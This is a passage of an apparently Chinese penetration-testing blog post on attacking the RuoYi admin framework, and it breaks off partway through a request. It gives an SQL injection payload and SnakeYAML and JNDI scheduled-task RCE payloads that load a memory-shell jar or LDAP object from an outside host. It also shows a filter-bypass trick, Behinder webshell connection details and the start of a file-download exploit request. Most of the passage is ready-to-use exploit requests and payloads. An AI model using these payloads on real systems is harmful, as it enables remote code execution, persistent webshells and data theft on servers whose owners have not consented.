+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">deptId</span><span class="o">=</span><span class="n">100</span><span class="o">&amp;</span><span class="n">parentId</span><span class="o">=</span><span class="n">0</span><span class="o">&amp;</span><span class="n">parentName</span><span class="o">=%</span><span class="n">E6</span><span class="o">%</span><span class="n">97</span><span class="o">%</span><span class="n">A0</span><span class="o">&amp;</span><span class="n">deptName</span><span class="o">=%</span><span class="n">E8</span><span class="o">%</span><span class="n">8B</span><span class="o">%</span><span class="n">A5</span><span class="o">%</span><span class="n">E4</span><span class="o">%</span><span class="n">BE</span><span class="o">%</span><span class="n">9D</span><span class="o">%</span><span class="n">E7</span><span class="o">%</span><span class="n">A7</span><span class="o">%</span><span class="n">91</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="n">8A</span><span class="o">%</span><span class="n">801</span><span class="o">&amp;</span><span class="n">orderNum</span><span class="o">=</span><span class="n">0</span><span class="o">&amp;</span><span class="n">leader</span><span class="o">=%</span><span class="n">E8</span><span class="o">%</span><span class="n">8B</span><span class="o">%</span><span class="n">A5</span><span class="o">%</span><span class="n">E4</span><span class="o">%</span><span class="n">BE</span><span class="o">%</span><span class="n">9D</span><span class="o">&amp;</span><span class="n">phone</span><span class="o">=</span><span class="n">15888888888</span><span class="o">&amp;</span><span class="n">email</span><span class="o">=</span><span class="n">ry</span><span class="o">%</span><span class="n">40qq</span><span class="p">.</span><span class="na">com</span><span class="o">&amp;</span><span class="n">status</span><span class="o">=</span><span class="n">0</span><span class="o">&amp;</span><span class="n">ancestors</span><span class="o">=</span><span class="n">0</span><span class="p">)</span><span class="n">or</span><span class="p">(</span><span class="n">extractvalue</span><span class="p">(</span><span class="n">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="n">0</span><span class="p">,(</span><span class="n">select</span><span class="o">+</span><span class="n">user</span><span class="p">()))));</span><span class="err">#</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/14.png"
+	width="2549"
+	height="1063"
+	srcset="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/14_hu60530a427dc8153e44ff67c841661cd7_443407_480x0_resize_box_3.png 480w, /p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/14_hu60530a427dc8153e44ff67c841661cd7_443407_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="239"
+		data-flex-basis="575px"
+	
+></p>
+<h3 id="27ruoyi定时任务rce">2.7.Ruoyi定时任务RCE
+</h3><p><strong>影响版本：Ruoyi&lt;4.7.8版本均存在计划任务RCE的可能</strong></p>
+<h4 id="271ruoyi-462定时任务rce">2.7.1.Ruoyi &lt;=4.6.2定时任务RCE
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">DNSlog验证</span><span class="err">：</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">org</span><span class="p">.</span><span class="na">yaml</span><span class="p">.</span><span class="na">snakeyaml</span><span class="p">.</span><span class="na">Yaml</span><span class="p">.</span><span class="na">load</span><span class="p">(</span><span class="err">&#39;</span><span class="o">!!</span><span class="n">javax</span><span class="p">.</span><span class="na">script</span><span class="p">.</span><span class="na">ScriptEngineManager</span><span class="w"> </span><span class="o">[!!</span><span class="n">java</span><span class="p">.</span><span class="na">net</span><span class="p">.</span><span class="na">URLClassLoader</span><span class="w"> </span><span class="o">[[!!</span><span class="n">java</span><span class="p">.</span><span class="na">net</span><span class="p">.</span><span class="na">URL</span><span class="w"> </span><span class="o">[</span><span class="s">&#34;http://j1l0x8j70f4op9zge5952tfvjmpdd81x.oastify.com&#34;</span><span class="o">]]]]</span><span class="err">&#39;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">monitor</span><span class="o">/</span><span class="n">job</span><span class="o">/</span><span class="n">add</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="n">1</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Host</span><span class="p">:</span><span class="w"> </span><span class="n">127</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span><span class="w"> </span><span class="n">327</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sec</span><span class="o">-</span><span class="n">ch</span><span class="o">-</span><span class="n">ua</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;Not(A:Brand&#34;</span><span class="p">;</span><span class="n">v</span><span class="o">=</span><span class="s">&#34;24&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Chromium&#34;</span><span class="p">;</span><span class="n">v</span><span class="o">=</span><span class="s">&#34;122&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">json</span><span class="p">,</span><span class="w"> </span><span class="n">text</span><span class="o">/</span><span class="n">javascript</span><span class="p">,</span><span class="w"> </span><span class="o">*/*</span><span class="p">;</span><span class="w"> </span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">01</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span><span class="p">;</span><span class="w"> </span><span class="n">charset</span><span class="o">=</span><span class="n">UTF</span><span class="o">-</span><span class="n">8</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">X</span><span class="o">-</span><span class="n">Requested</span><span class="o">-</span><span class="n">With</span><span class="p">:</span><span class="w"> </span><span class="n">XMLHttpRequest</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sec</span><span class="o">-</span><span class="n">ch</span><span class="o">-</span><span class="n">ua</span><span class="o">-</span><span class="n">mobile</span><span class="p">:</span><span class="w"> </span><span class="o">?</span><span class="n">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="n">5</span><span class="p">.</span><span class="na">0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="n">10</span><span class="p">.</span><span class="na">0</span><span class="p">;</span><span class="w"> </span><span class="n">Win64</span><span class="p">;</span><span class="w"> </span><span class="n">x64</span><span class="p">)</span><span class="w"> </span><span class="n">AppleWebKit</span><span class="o">/</span><span class="n">537</span><span class="p">.</span><span class="na">36</span><span class="w"> </span><span class="p">(</span><span class="n">KHTML</span><span class="p">,</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="n">Gecko</span><span class="p">)</span><span class="w"> </span><span class="n">Chrome</span><span class="o">/</span><span class="n">122</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">6261</span><span class="p">.</span><span class="na">112</span><span class="w"> </span><span class="n">Safari</span><span class="o">/</span><span class="n">537</span><span class="p">.</span><span class="na">36</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sec</span><span class="o">-</span><span class="n">ch</span><span class="o">-</span><span class="n">ua</span><span class="o">-</span><span class="n">platform</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;Windows&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Origin</span><span class="p">:</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="c1">//127.0.0.1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">Site</span><span class="p">:</span><span class="w"> </span><span class="n">same</span><span class="o">-</span><span class="n">origin</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">Mode</span><span class="p">:</span><span class="w"> </span><span class="n">cors</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">Dest</span><span class="p">:</span><span class="w"> </span><span class="n">empty</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Referer</span><span class="p">:</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="c1">//127.0.0.1/monitor/job/add</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span><span class="p">,</span><span class="w"> </span><span class="n">br</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span><span class="w"> </span><span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">9</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Cookie</span><span class="p">:</span><span class="w"> </span><span class="n">JSESSIONID</span><span class="o">=</span><span class="n">9b2fa9cc</span><span class="o">-</span><span class="n">71ce</span><span class="o">-</span><span class="n">4a5e</span><span class="o">-</span><span class="n">ad46</span><span class="o">-</span><span class="n">a9c82d44edfb</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">close</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">createBy</span><span class="o">=</span><span class="n">admin</span><span class="o">&amp;</span><span class="n">jobName</span><span class="o">=</span><span class="n">RCE</span><span class="o">&amp;</span><span class="n">jobGroup</span><span class="o">=</span><span class="n">DEFAULT</span><span class="o">&amp;</span><span class="n">invokeTarget</span><span class="o">=</span><span class="n">org</span><span class="p">.</span><span class="na">yaml</span><span class="p">.</span><span class="na">snakeyaml</span><span class="p">.</span><span class="na">Yaml</span><span class="p">.</span><span class="na">load</span><span class="p">(</span><span class="err">&#39;</span><span class="o">!!</span><span class="n">javax</span><span class="p">.</span><span class="na">script</span><span class="p">.</span><span class="na">ScriptEngineManager</span><span class="o">+%</span><span class="n">5B</span><span class="o">!!</span><span class="n">java</span><span class="p">.</span><span class="na">net</span><span class="p">.</span><span class="na">URLClassLoader</span><span class="o">+%</span><span class="n">5B</span><span class="o">%</span><span class="n">5B</span><span class="o">!!</span><span class="n">java</span><span class="p">.</span><span class="na">net</span><span class="p">.</span><span class="na">URL</span><span class="o">+%</span><span class="n">5B</span><span class="o">%</span><span class="n">22http</span><span class="o">%</span><span class="n">3A</span><span class="o">%</span><span class="n">2F</span><span class="o">%</span><span class="n">2Fj1l0x8j70f4op9zge5952tfvjmpdd81x</span><span class="p">.</span><span class="na">oastify</span><span class="p">.</span><span class="na">com</span><span class="o">%</span><span class="n">22</span><span class="o">%</span><span class="n">5D</span><span class="o">%</span><span class="n">5D</span><span class="o">%</span><span class="n">5D</span><span class="o">%</span><span class="n">5D</span><span class="err">&#39;</span><span class="p">)</span><span class="o">&amp;</span><span class="n">cronExpression</span><span class="o">=*+*+*+*+*+%</span><span class="n">3F</span><span class="o">&amp;</span><span class="n">misfirePolicy</span><span class="o">=</span><span class="n">1</span><span class="o">&amp;</span><span class="n">concurrent</span><span class="o">=</span><span class="n">1</span><span class="o">&amp;</span><span class="n">status</span><span class="o">=</span><span class="n">0</span><span class="o">&amp;</span><span class="n">remark</span><span class="o">=</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/15.png"
+	width="1567"
+	height="1105"
+	srcset="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/15_hu2944192783835124104435406fa2f84d_143391_480x0_resize_box_3.png 480w, /p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/15_hu2944192783835124104435406fa2f84d_143391_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="141"
+		data-flex-basis="340px"
+	
+></p>
+<p>打内存马：https://github.com/lz2y/yaml-payload-for-ruoyi</p>
+<p>下载利用包，使用mvn package打成jar包，开启共享，远程加载</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">org</span><span class="p">.</span><span class="na">yaml</span><span class="p">.</span><span class="na">snakeyaml</span><span class="p">.</span><span class="na">Yaml</span><span class="p">.</span><span class="na">load</span><span class="p">(</span><span class="err">&#39;</span><span class="o">!!</span><span class="n">javax</span><span class="p">.</span><span class="na">script</span><span class="p">.</span><span class="na">ScriptEngineManager</span><span class="w"> </span><span class="o">[!!</span><span class="n">java</span><span class="p">.</span><span class="na">net</span><span class="p">.</span><span class="na">URLClassLoader</span><span class="w"> </span><span class="o">[[!!</span><span class="n">java</span><span class="p">.</span><span class="na">net</span><span class="p">.</span><span class="na">URL</span><span class="w"> </span><span class="o">[</span><span class="s">&#34;http://192.168.112.203:8000/yaml-payload-for-ruoyi-1.0-SNAPSHOT.jar&#34;</span><span class="o">]]]]</span><span class="err">&#39;</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/16.png"
+	width="1633"
+	height="347"
+	srcset="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/16_hub2cf0ac9efc29048eddf01671a7aaa14_36618_480x0_resize_box_3.png 480w, /p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/16_hub2cf0ac9efc29048eddf01671a7aaa14_36618_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="470"
+		data-flex-basis="1129px"
+	
+></p>
+<p><img src="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/17.png"
+	width="2239"
+	height="1139"
+	srcset="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/17_hu79ac48cc59912a0f1bcc9ca686290052_257003_480x0_resize_box_3.png 480w, /p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/17_hu79ac48cc59912a0f1bcc9ca686290052_257003_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="196"
+		data-flex-basis="471px"
+	
+></p>
+<p>访问：http://127.0.0.1/login?cmd=whoami</p>
+<p><img src="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/18.png"
+	width="1043"
+	height="200"
+	srcset="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/18_hu12839664224aca6787a0a7c381a128ae_12650_480x0_resize_box_3.png 480w, /p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/18_hu12839664224aca6787a0a7c381a128ae_12650_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="521"
+		data-flex-basis="1251px"
+	
+></p>
+<ol>
+<li>连接冰蝎：/login?cmd=1（cmd不为空即可），密码为rebeyond，使用冰蝎正常连接即可</li>
+<li>卸载内存马：?cmd=delete</li>
+</ol>
+<p><img src="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/19.png"
+	width="2242"
+	height="1291"
+	srcset="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/19_hu927e029ad459b3f8c881a16854c6b9e9_487287_480x0_resize_box_3.png 480w, /p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/19_hu927e029ad459b3f8c881a16854c6b9e9_487287_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="173"
+		data-flex-basis="416px"
+	
+></p>
+<h4 id="272ruoyi472-bypass定时任务打内存马">2.7.2.Ruoyi&lt;4.7.2 Bypass定时任务打内存马
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Bypass打内存马</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Bypass咱们只需要在屏蔽的协议加上单引号</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">org</span><span class="p">.</span><span class="na">yaml</span><span class="p">.</span><span class="na">snakeyaml</span><span class="p">.</span><span class="na">Yaml</span><span class="p">.</span><span class="na">load</span><span class="p">(</span><span class="err">&#39;</span><span class="o">!!</span><span class="n">javax</span><span class="p">.</span><span class="na">script</span><span class="p">.</span><span class="na">ScriptEngineManager</span><span class="w"> </span><span class="o">[!!</span><span class="n">java</span><span class="p">.</span><span class="na">net</span><span class="p">.</span><span class="na">URLClassLoader</span><span class="w"> </span><span class="o">[[!!</span><span class="n">java</span><span class="p">.</span><span class="na">net</span><span class="p">.</span><span class="na">URL</span><span class="w"> </span><span class="o">[</span><span class="s">&#34;h&#39;t&#39;t&#39;p://192.168.112.203:8000/yaml-payload-for-ruoyi-1.0-SNAPSHOT.jar&#34;</span><span class="o">]]]]</span><span class="err">&#39;</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/20.png"
+	width="2169"
+	height="1118"
+	srcset="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/20_hucb787a02c14bd7213b568b2c8237ae8f_227419_480x0_resize_box_3.png 480w, /p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/20_hucb787a02c14bd7213b568b2c8237ae8f_227419_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="194"
+		data-flex-basis="465px"
+	
+></p>
+<p><img src="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/21.png"
+	width="1262"
+	height="351"
+	srcset="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/21_huaf513e6f29f992be6cec949fb9c4c9e6_25067_480x0_resize_box_3.png 480w, /p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/21_huaf513e6f29f992be6cec949fb9c4c9e6_25067_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="359"
+		data-flex-basis="862px"
+	
+></p>
+<h4 id="273ruoyi478-定时任务rce">2.7.3.Ruoyi&lt;=4.7.8 定时任务RCE
+</h4><p><a class="link" href="https://mp.weixin.qq.com/s/8-pRS7SM1SxWY6HYeORLlw?click_id=2"  target="_blank" rel="noopener"
+    >https://mp.weixin.qq.com/s/8-pRS7SM1SxWY6HYeORLlw?click_id=2</a></p>
+<p><strong>影响版本：4.7.0&lt;Ruoyi&lt;=4.7.8</strong></p>
+<p><strong>前提条件存在ruoyi&lt;=4.7.5  createTable sql注入漏洞</strong></p>
+<p><img src="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/22.png"
+	width="1818"
+	height="1181"
+	srcset="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/22_hu9c306fe1f84b888d32f367c4a485d77d_205020_480x0_resize_box_3.png 480w, /p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/22_hu9c306fe1f84b888d32f367c4a485d77d_205020_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="153"
+		data-flex-basis="369px"
+	
+></p>
+<p><img src="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/23.png"
+	width="1628"
+	height="512"
+	srcset="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/23_hu654a9d92c13eebc69fc8cd8c31461f4a_90574_480x0_resize_box_3.png 480w, /p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/23_hu654a9d92c13eebc69fc8cd8c31461f4a_90574_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="317"
+		data-flex-basis="763px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">javax</span><span class="p">.</span><span class="na">naming</span><span class="p">.</span><span class="na">InitialContext</span><span class="p">.</span><span class="na">lookup</span><span class="p">(</span><span class="err">&#39;</span><span class="n">ldap</span><span class="p">:</span><span class="c1">//192.168.112.203:1389/gz0syz&#39;)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">0x6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f3139322e3136382e3131322e3230333a313338392f6972726c78682729</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">genTableServiceImpl</span><span class="p">.</span><span class="na">createTable</span><span class="p">(</span><span class="err">&#39;</span><span class="n">UPDATE</span><span class="w"> </span><span class="n">sys_job</span><span class="w"> </span><span class="n">SET</span><span class="w"> </span><span class="n">invoke_target</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0x6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f3139322e3136382e3131322e3230333a313338392f6972726c78682729</span><span class="w"> </span><span class="n">WHERE</span><span class="w"> </span><span class="n">job_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">3</span><span class="p">;</span><span class="err">&#39;</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/24.png"
+	width="2203"
+	height="698"
+	srcset="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/24_hu2ae0f2996991832c5f83bd179c3743d7_133639_480x0_resize_box_3.png 480w, /p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/24_hu2ae0f2996991832c5f83bd179c3743d7_133639_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="315"
+		data-flex-basis="757px"
+	
+></p>
+<p><img src="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/25.png"
+	width="2193"
+	height="1086"
+	srcset="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/25_hu889f801dae7c019bfc64a4c6b485c4dd_213994_480x0_resize_box_3.png 480w, /p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/25_hu889f801dae7c019bfc64a4c6b485c4dd_213994_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="201"
+		data-flex-basis="484px"
+	
+></p>
+<h3 id="28ruoyi478-任意文件下载漏洞cve-2023-27025">2.8.Ruoyi&lt;4.7.8 任意文件下载漏洞（CVE-2023-27025）
+</h3><p><a class="link" href="https://mp.weixin.qq.com/s/x_-N6YVzJW-INbJ02y_qVQ"  target="_blank" rel="noopener"
+    >https://mp.weixin.qq.com/s/x_-N6YVzJW-INbJ02y_qVQ</a></p>
+<p>前提条件：</p>
+<p>目标系统启用了定时任务模块（默认开启）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">monitor</span><span class="o">/</span><span class="n">job</span><span class="o">/</span><span class="n">add</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="n">1</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Host</span><span class="p">:</span><span class="w"> </span><span class="n">127</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sec</span><span class="o">-</span><span class="n">ch</span><span class="o">-</span><span class="n">ua</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;Not(A:Brand&#34;</span><span class="p">;</span><span class="n">v</span><span class="o">=</span><span class="s">&#34;24&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Chromium&#34;</span><span class="p">;</span><span class="n">v</span><span class="o">=</span><span class="s">&#34;122&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="o">*/*</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">X</span><span class="o">-</span><span class="n">Requested</span><span class="o">-</span><span class="n">With</span><span class="p">:</span><span class="w"> </span><span class="n">XMLHttpRequest</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sec</span><span class="o">-</span><span class="n">ch</span><span class="o">-</span><span class="n">ua</span><span class="o">-</span><span class="n">mobile</span><span class="p">:</span><span class="w"> </span><span class="o">?</span><span class="n">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="n">5</span><span class="p">.</span><span class="na">0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="n">10</span><span class="p">.</span><span class="na">0</span><span class="p">;</span><span class="w"> </span><span class="n">Win64</span><span class="p">;</span><span class="w"> </span><span class="n">x64</span><span class="p">)</span><span class="w"> </span><span class="n">AppleWebKit</span><span class="o">/</span><span class="n">537</span><span class="p">.</span><span class="na">36</span><span class="w"> </span><span class="p">(</span><span class="n">KHTML</span><span class="p">,</span><span class="w"> </span><span 